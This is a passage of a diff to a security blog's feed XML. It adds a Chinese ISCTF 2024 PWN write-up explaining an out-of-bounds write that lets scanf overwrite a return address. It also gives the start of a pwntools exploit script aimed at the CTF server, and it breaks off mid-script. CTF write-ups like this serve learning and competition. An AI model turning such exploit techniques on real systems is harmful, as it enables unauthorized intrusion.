@@ -3,32 +3,32 @@
     <id>https://yhuanhuan01.github.io</id>
     <title> • Posts by &#34;wp&#34; tag</title>
     <link href="https://yhuanhuan01.github.io" />
-    <updated>2024-08-06T07:51:19.000Z</updated>
-    <category term="Game" />
+    <updated>2024-11-18T10:15:03.000Z</updated>
     <category term="栈" />
     <category term="shellcode" />
     <category term="rw" />
+    <category term="Game" />
     <category term="CVE-复现系列" />
-    <category term="技巧" />
     <category term="堆拓展攻击" />
     <category term="orw" />
     <category term="堆栈结合" />
-    <category term="wp" />
+    <category term="技巧" />
     <category term="IO_FILE" />
+    <category term="wp" />
     <category term="靶机渗透" />
     <category term="vulnHUB" />
     <category term="canary" />
     <category term="堆" />
+    <category term="pie" />
+    <category term="格式化字符串漏洞" />
     <category term="csu" />
     <category term="rop" />
     <category term="gdb" />
-    <category term="pie" />
-    <category term="格式化字符串漏洞" />
     <category term="house系列" />
-    <category term="house-of-apple" />
-    <category term="house-of-force" />
     <category term="house-of-einherjar" />
+    <category term="house-of-force" />
     <category term="house-of-orange" />
+    <category term="house-of-apple" />
     <category term="house-of-rabbit" />
     <category term="house-of-spirit" />
     <category term="格式化字符串" />
@@ -36,14 +36,494 @@
     <category term="栈劫持" />
     <category term="protocol" />
     <category term="srop" />
-    <category term="uaf" />
     <category term="house-of-lore" />
     <category term="tcache-stashing-unlink-attack" />
     <category term="unlink" />
+    <category term="uaf" />
     <category term="got改写" />
     <category term="随机数检查" />
     <category term="堆——格式化字符串" />
     <category term="栈迁移" />
+    <entry>
+        <id>https://yhuanhuan01.github.io/2024/11/18/ISCTF-WP-PWN/</id>
+        <title>ISCTF_WP_PWN</title>
+        <link rel="alternate" href="https://yhuanhuan01.github.io/2024/11/18/ISCTF-WP-PWN/"/>
+        <content type="html">&lt;h1 id=&#34;isctf-2024&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#isctf-2024&#34;&gt;#&lt;/a&gt; ISCTF 2024&lt;/h1&gt;
+&lt;p&gt;好久没更新 blog 了，随便更新一篇近期的比赛吧。&lt;/p&gt;
+&lt;h2 id=&#34;netcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#netcat&#34;&gt;#&lt;/a&gt; Netcat&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/2.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;girlfriend&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#girlfriend&#34;&gt;#&lt;/a&gt; girlfriend&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/3.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/4.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;s1 要匹配 admin，通过 read 读入 buf，将 s1 处覆盖成 admin&lt;/p&gt;
+&lt;p&gt;在 vuln 函数有数组越界改写漏洞，通过越界改写 i，从而 sacnf 可以改写返回&lt;/p&gt;
+&lt;p&gt;exp 如下&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;huan_attack_pwn&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# from LibcSearcher import *&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# from ctypes import *&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# context(arch=&#39;i386&#39; , os=&#39;linux&#39;, log_level=&#39;debug&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;binary &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;./pwn&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# libc = &#39;./&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;27.25.151.12:34617&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\033[31;40mremote\033[0m: (y)\n&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#39;\033[32;40mprocess\033[0m: (n)&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;y&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binary&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# r = gdb.debug(binary)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# libc = cdll.LoadLibrary(libc)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# libc = ELF(libc)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# elf = ELF(binary)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# srand = libc.srand (libc.time (0)) #设置种子&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;default &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;se      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; data                     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sa      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; delim&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data              &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delim&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; data                     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sla     &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; delim&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data              &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delim&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rc      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; numb&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4096&lt;/span&gt;                &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;numb&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rl      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; time&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;default             &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ru      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; delims&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; time&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;default     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delims&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rpu     &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; delims&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; time&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;default     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delims&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;time&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;drop&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;uu32    &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; data                     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; u32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;\0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;uu64    &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; data                     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;\0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lic     &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; data                     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; uu64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ru&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;padding &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; length                   &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;Yhuan&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;length &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;Y&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;length &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lg      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; var_name                 &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; log&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;success&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;var_name&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt; ：0x&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;globals&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;var_name&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token format-spec&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;prl     &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; var_name                 &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;debug   &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; command&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;               &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; gdb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attach&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;command&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;it      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt;                          &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;admin\x00\x00\x00&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ru&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;team id\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;se&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 